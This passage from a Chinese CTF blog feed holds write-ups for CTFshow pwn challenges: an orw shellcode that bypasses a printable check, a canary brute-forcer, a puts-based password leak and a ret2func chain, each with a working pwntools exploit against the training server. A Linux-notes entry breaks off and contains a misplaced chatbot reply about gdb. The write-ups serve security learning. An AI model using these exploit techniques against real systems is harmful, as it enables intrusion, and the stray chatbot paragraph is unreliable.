class="line">.text:0000000000400ADF 48 98                         cdqe</span><br><span class="line">.text:0000000000400AE1 C6 44 05 90 00                mov     [rbp+rax+s], 0</span><br><span class="line">.text:0000000000400AE6 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AEA 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000400AED E8 F8 FD FF FF                call    is_printable</span><br><span class="line">.text:0000000000400AED</span><br><span class="line">.text:0000000000400AF2 85 C0                         test    eax, eax</span><br><span class="line">.text:0000000000400AF4 74 08                         jz      short loc_400AFE</span><br><span class="line">.text:0000000000400AF4</span><br><span class="line">.text:0000000000400AF6 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AFA FF D0                         call    rax</span><br></pre></td></tr></table></figure><p>可以发现read读入的数据存放的地址为 [rbp+s] 最后调用的rax也等于 [rbp+s]故只要在read处写入orw即可，但是进入到is_printable会检查每一个字符是否可打印，我们的汇编转为机器码后变为二进制数据，其中通常会有很多不可打印字符，故需要绕过该循环防止程序直接通过跳过call rax导致shellcode无法执行</p><p>相关汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400AED E8 F8 FD FF FF                call    is_printable</span><br><span class="line">.text:0000000000400AED</span><br><span class="line">.text:0000000000400AF2 85 C0                         test    eax, eax  </span><br><span class="line">.text:0000000000400AF4 74 08                         jz      short loc_400AFE</span><br><span class="line">;如果有不可打印字符则jz到loc_400AFE</span><br><span class="line">.text:0000000000400AF4</span><br><span class="line">.text:0000000000400AF6 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AFA 90                            call    rax</span><br><span class="line">.text:0000000000400AFB 90                            </span><br><span class="line">.text:0000000000400AFC EB 0C                         jmp     short loc_400B0A</span><br><span class="line">.text:0000000000400AFC</span><br><span class="line">.text:0000000000400AFE                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400AFE;在下方继续执行</span><br><span class="line">.text:0000000000400AFE                               loc_400AFE:                             ; CODE XREF: main+8C↑j</span><br><span class="line">.text:0000000000400AFE 48 8D 3D F5 05 00 00          lea     rdi, aItMustBeAPrint            ; &quot;It must be a printable name!&quot;</span><br><span class="line">.text:0000000000400B05 E8 56 FB FF FF                call    _puts</span><br><span class="line">.text:0000000000400B05</span><br><span class="line">.text:0000000000400B0A</span><br><span class="line">.text:0000000000400B0A                               loc_400B0A:                             ; CODE XREF: main+94↑j</span><br><span class="line">.text:0000000000400B0A B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400B0F 48 8B 4D F8                   mov     rcx, [rbp+var_8]</span><br><span class="line">.text:0000000000400B13 64 48 33 0C 25 28 00 00 00    xor     rcx, fs:28h</span><br><span class="line">.text:0000000000400B1C 74 05                         jz      short locret_400B23</span><br><span class="line">.text:0000000000400B1C</span><br><span class="line">.text:0000000000400B1E E8 5D FB FF FF                call    ___stack_chk_fail</span><br><span class="line">.text:0000000000400B1E</span><br><span class="line">.text:0000000000400B23                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400B23</span><br><span class="line">.text:0000000000400B23                               locret_400B23:                          ; CODE XREF: main+B4↑j</span><br><span class="line">.text:0000000000400B23 C9                            leave</span><br><span class="line">.text:0000000000400B24 C3                            retn</span><br></pre></td></tr></table></figure><p>shellcode以’\x00’开头即可截断strlen</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28127</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#调用opean</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">push 0               ;绕strlean </span></span><br><span class="line"><span class="string">mov r15, 0x67616c66  ;flag</span></span><br><span class="line"><span class="string">push r15;将flag压入栈</span></span><br><span class="line"><span class="string">mov rdi, rsp;此时rsp指向r15故为将flag的地址给rdi作为opean的地址</span></span><br><span class="line"><span class="string">mov rsi, 0;只读的方式打开</span></span><br><span class="line"><span class="string">mov rax, 2    ;rax=2对应调用opean</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#调用read</span></span><br><span class="line">shellcode += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r14, 3;文件描述符一般从3开始即opean返回的3存入r14</span></span><br><span class="line"><span class="string">mov rdi, r14;将文件描述符放入rdi</span></span><br><span class="line"><span class="string">mov rsi, rsp;rsp为flag的地址读取flag中的内容</span></span><br><span class="line"><span class="string">mov rdx, 0xff;可read0xff大小的内容</span></span><br><span class="line"><span class="string">mov rax, 0;rax=0对应调用read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"><span class="comment">#调用write</span></span><br><span class="line">shellcode +=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, 1;写入到标准输出</span></span><br><span class="line"><span class="string">mov rsi, rsp;rsp为flag的地址写出flag中的内容</span></span><br><span class="line"><span class="string">mov rdx, 0xff;可write0xff大小的内容</span></span><br><span class="line"><span class="string">mov rax, 1;rax=1对应调用write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome,tell me your name:\n&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow刷题日记53-55</title>
      <link href="/2024/12/10/CTFshow%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B053-55/"/>
      <url>/2024/12/10/CTFshow%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B053-55/</url>
      
        <content type="html"><![CDATA[<h1 id="爆破”Canary”-pwn53"><a href="#爆破”Canary”-pwn53" class="headerlink" title="爆破”Canary” pwn53"></a>爆破”Canary” pwn53</h1><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>题目hint：”再多看一眼就会爆炸”</p><p>可能会遇到爆破</p><p>checksec</p><p><img src="/../images/%E7%88%86%E7%A0%B4canary/checksec.png" alt="1"></p><p>IDA分析</p><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  canary();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">canary</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/canary.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/canary.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fread(&amp;global_canary, <span class="number">1u</span>, <span class="number">4u</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;  <span class="comment">//调用canary函数读取静态的canary.txt文件中的内容将其存到bss段上的global_canary变量处</span></span><br></pre></td></tr></table></figure><p>ctfshow函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+4h] [ebp-54h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+8h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> s1; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  s1 = global_canary;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;v2[v5], <span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2[v5] == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125; <span class="comment">//读取字符到v2这个字符数组中直到接收到&#x27;\n&#x27;其对应ASCII码为10</span></span><br><span class="line">  __isoc99_sscanf(v2, <span class="string">&quot;%d&quot;</span>, &amp;nbytes); <span class="comment">//将v2字符数组(字符串)转为整数并存入nbytes中充当后续read函数的读入数据大小</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>); <span class="comment">//输出$提醒用户输入</span></span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes); <span class="comment">//获取输入到buf数组中</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;global_canary, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error *** Stack Smashing Detected *** : Canary Value Incorrect!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;<span class="comment">//比较s1于global_canary，检查s1是否被覆盖，模拟了canary的保护机制，如果被覆盖则输出....</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where is the flag?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/%E7%88%86%E7%A0%B4canary/s1.png" alt="1"></p><p>由IDA分析出的信息可知buf的起始地址距离ebp 0x30，s1距离ebp 0x10，并在IDA分析中发现后门函数，只要通过read栈溢出控制执行流到后门函数即可获得flag</p><p>但我们要保证s1的值不被更改所以需要逐字节爆破出”Canary”</p><h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span> </span><br><span class="line"><span class="comment">#初始化一个空的字节串，用于存储canary值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): </span><br><span class="line">    <span class="comment">#开始一个循环，目的是逐字节地找出canary值。因为canary是4个字节，所以循环4次</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>):</span><br><span class="line">        <span class="comment">#两位16进制数表示一个字节，该循环是为了遍历所有字节</span></span><br><span class="line">        io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28148</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;200&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(j) </span><br><span class="line">        <span class="comment">#p8(j)是将尝试的字符转为小端序，逐个字节覆盖s1 </span></span><br><span class="line">        io.sendafter(<span class="string">&#x27;$ &#x27;</span>,payload)</span><br><span class="line">        ans = <span class="built_in">str</span>(io.recv())</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Canary Value Incorrect!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans: </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;No<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> byte is <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&quot;</span>) </span><br><span class="line">            <span class="comment">#如果尝试成功i+1 并将j转换成十六进制数输出</span></span><br><span class="line">            canary += p8(j)</span><br><span class="line">            <span class="comment">#记录该转换成功的字节</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;trying&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28148</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p32(<span class="number">0</span>)*<span class="number">4</span> + p32(flag)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;$ &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="puts额外输出-pwn54"><a href="#puts额外输出-pwn54" class="headerlink" title="puts额外输出 pwn54"></a>puts额外输出 pwn54</h1><h2 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h2><p>checksec </p><p><img src="/../images/%E7%88%86%E7%A0%B4canary/checksec.png" alt="1"></p><p>IDA分析</p><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-160h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-60h] BYREF //注意v5于s相差0x100</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+180h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [esp+184h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+194h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========CTFshow-LOGIN==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Username:&quot;</span>);</span><br><span class="line">  fgets(v5, <span class="number">256</span>, <span class="built_in">stdin</span>);  <span class="comment">//v5最多只可读255个字符，故可溢出一个字符</span></span><br><span class="line">  v8 = <span class="built_in">strchr</span>(v5, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    *v8 = <span class="number">0</span>; <span class="comment">//如果输入小于256&#x27;\n&#x27;也会被读入将读入的换行符换为&#x27;\0&#x27;</span></span><br><span class="line">  <span class="built_in">strcat</span>(v5, <span class="string">&quot;,\nInput your Password.&quot;</span>); <span class="comment">//将后面这一串连接到V5字符的末尾</span></span><br><span class="line">  stream = fopen(<span class="string">&quot;/password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/password.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream); <span class="comment">//将密码读入s中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(v5); <span class="comment">//输出v5中的字符</span></span><br><span class="line">  fgets(s1, <span class="number">64</span>, <span class="built_in">stdin</span>); <span class="comment">//获取输入存入s1</span></span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s) ) <span class="comment">//比较s1于s中的字符是否相等</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag(); <span class="comment">//调用后门函数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对主函数分析，发现v5与s刚好在栈上相邻，且输入name时存在一个字节的溢出</p><p>我们可以利用该溢出覆盖v5中的象征字符串结尾的 ‘\0’ puts函数检测到’\0’才停止输出，覆盖后便可将s中的内容一起输出，得到Password</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28237</span>)</span><br><span class="line">payload=cyclic(<span class="number">0x100</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#先获取Password</span></span><br></pre></td></tr></table></figure><p> <img src="/../images/%E7%88%86%E7%A0%B4canary/Password.png" alt="1"></p><p>逗号后这部分即为Password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改脚本使用已知Password，用脚本自动实现有点麻烦所以就选择手动拿</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28237</span>)</span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn55"><a href="#pwn55" class="headerlink" title="pwn55"></a>pwn55</h1><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28268</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag1_addr=elf.sym[<span class="string">&#x27;flag_func1&#x27;</span>]</span><br><span class="line">flag2_addr=elf.sym[<span class="string">&#x27;flag_func2&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2C</span>+<span class="number">4</span>)+p32(flag1_addr)+p32(flag2_addr)+p32(flag)+p32(<span class="number">0xACACACAC</span>)+p32(<span class="number">0xBDBDBDBD</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;flag:&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注意：IDA中可以按h转换整数进制，<code>if(flag1 &amp;&amp; flag2 &amp;&amp; a1 == 0xBDBDBDBD)</code>当flag1、flag2均为1且a1&#x3D;0xBDBDBDBD时为真，进入if内部。而不是三个变量均为0xBDBDBDBD</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_pwn前置杂记</title>
      <link href="/2024/12/09/ctfshow%E5%89%8D%E7%BD%AE/"/>
      <url>/2024/12/09/ctfshow%E5%89%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="一些Linux指令"><a href="#一些Linux指令" class="headerlink" title="一些Linux指令"></a>一些Linux指令</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>SSH（Secure Shell）是一种网络协议，用于安全地远程登录到计算机系统。SSH 主要用于以下场景：</p><p>远程命令行登录<br>文件传输（通过 SFTP 或 SCP）<br>端口转发</p><p>使用格式：</p><p>ssh ctfshow@题目地址 -p题目端口号</p><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p><code>ls</code> 命令用于列出目录内容</p><p>eg:</p><ul><li><p><code>ls</code>：列出当前目录的内容。</p></li><li><p><code>ls -l</code>：以长格式列出当前目录的内容，显示文件的详细信息。</p></li><li><p><code>ls -a</code>：列出当前目录的所有文件，包括隐藏文件（以点开头的文件）。</p></li><li><p><code>ls /path/to/directory/</code>：列出指定目录的内容。</p><p>注：ls后加 &#x2F; 是为了明确指定路径避免歧义</p></li></ul><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><code>nc</code>（Netcat）是一个功能强大的网络工具，用于读取和写入网络连接</p><p>看起来你正在使用 <code>gdb</code>（GNU 调试器）来调试一个程序。<code>gdb</code> 是一个强大的工具，可以帮助你分析和调试程序的行为。如果你有具体的调试需求或遇到问题，请告诉我更多细节，我可以提供进一步的帮助。</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>echo 是一个常用的命令行工具，用于<strong>将指定的文本输出到标准输出设备（通常是终端，也可以是指定文件）</strong>。这个命令非常简单但功能强大，常用于脚本编写和日常操作中的调试信息显示。</p><p>echo [选项] [字符串]</p><p>利用echo将CTFshow写入key文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;CTFshow&quot;&gt;key  //&gt;为重定向，可以理解为重定向了标准输出设备</span><br></pre></td></tr></table></figure><p>常见选项：</p><p>-n : 不输出末尾的换行符</p><p>-e : 启用对反斜杠转义字符的支持</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>使用 <code>exec</code> 